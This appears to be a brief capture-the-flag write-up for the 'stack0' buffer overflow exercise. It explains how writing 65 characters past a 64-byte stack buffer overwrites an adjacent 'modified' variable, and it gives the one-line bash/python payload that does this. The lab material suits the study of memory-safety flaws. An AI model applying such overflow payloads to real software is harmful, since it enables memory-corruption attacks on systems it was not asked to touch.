#### Stack0

In the stack, the buffer is filled with 64 characters, then the next position is the "modified" varible, where you can modify it accesing the next positions of the stack

**Stack**
<-- BUFFER (64) --><-- modified (8) -->
**Result**
<-- XXXXXXX...XXXXXXXXXXodified (8) -->

```bash
echo `python -c 'print("X"*65)'` | ./stack0
```
